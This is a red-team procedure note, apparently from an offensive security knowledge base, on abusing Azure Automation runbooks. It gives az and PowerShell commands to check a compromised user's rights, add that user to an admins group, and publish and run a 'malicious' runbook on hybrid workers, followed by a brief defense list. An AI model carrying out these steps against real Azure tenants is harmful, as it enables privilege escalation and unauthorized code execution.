---
id: 729931ac-c5e6-41d5-9c5d-9e1e49f4ee44
name: Azure Runbook Automation
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.541167+00:00'
updated_at: '2023-05-24T22:51:17.531111+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Scripting|T1064 - Scripting]]'
platforms:
- Cloud
tags:
- '[[Azure Runbook]]'
- '[[Cloud - Azure]]'
- '[[Create a Runbook]]'
- '[[Runbook Automation]]'
commands:
- '[[Add user to Automation Admins group]]'
- '[[Check user right for automation]]'
- '[[Create PowerShell Runbook]]'
- '[[Get user role on the Automation account]]'
- '[[List automation account]]'
- '[[List hybrid workers]]'
- '[[List owned objects]]'
- '[[Publish Runbook]]'
- '[[Start Runbook]]'
---

# Azure Runbook Automation

**Status**: ✓ Verified

## Summary

Azure Runbook Automation is a method for automating repetitive tasks in Azure. This can include tasks such as scaling resources, deploying infrastructure, or performing maintenance tasks. By creating a runbook, users can automate these tasks and save time and effort. From an offensive perspective, 

## Description

# Description

Azure Runbook Automation is a method for automating repetitive tasks in Azure. This can include tasks such as scaling resources, deploying infrastructure, or performing maintenance tasks. By creating a runbook, users can automate these tasks and save time and effort. From an offensive perspective, this can be used to automate malicious activities, such as data exfiltration or privilege escalation. From a technical perspective, runbooks are created using PowerShell scripts and can be triggered manually or on a schedule. From a business value perspective, this can reduce the time and effort needed for routine tasks, allowing IT staff to focus on more strategic initiatives.

## Requirements

1. Access to an Automation Account in Azure

1. Knowledge of PowerShell scripting

## Defense

1. Ensure that only authorized personnel have access to the Automation Account

1. Monitor the execution of runbooks for any suspicious activity

1. Implement logging and auditing to track changes and actions taken through runbooks

## Objectives

1. Verify compromised user's Azure privileges.

1. Elevate privileges via "Automation Admins" group.

1. Determine user's role on Automation account.

1. Identify available Hybrid Worker groups.

1. Create Runbook with malicious content.

1. Publish the malicious Runbook.

1. Execute Runbook on Hybrid Worker group.

# Instructions

*<u>Overv*iew</u>

**Code**: [[# Check user right for automation
az extension add]]

## 

## Steps

To Create and Execute an Azure Runbook, follow these steps:

1. Check user right for automation by running the following commands:

**Command** ([[Check user right for automation]]):

```bash
az extension add --upgrade -n automation
```

**Command** ([[List automation account]]):

```bash
az automation account list
```

**Command** ([[List owned objects]]):

```bash
az ad signed-in-user list-owned-objects
```

**Command** ([[Add user to Automation Admins group]]):

```bash
Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose
```

**Command** ([[Get user role on the Automation account]]):

```bash
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>
```

**Command** ([[List hybrid workers]]):

```bash
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>
```

**Command** ([[Create PowerShell Runbook]]):

```powershell
Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose
```

**Command** ([[Publish Runbook]]):

```bash
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```

**Command** ([[Start Runbook]]):

```bash
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```

## Platforms

- Cloud

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Add user to Automation Admins group]]
- [[Check user right for automation]]
- [[Create PowerShell Runbook]]
- [[Get user role on the Automation account]]
- [[List automation account]]
- [[List hybrid workers]]
- [[List owned objects]]
- [[Publish Runbook]]
- [[Start Runbook]]

## Tags

- [[Azure Runbook]]
- [[Cloud - Azure]]
- [[Create a Runbook]]
- [[Runbook Automation]]
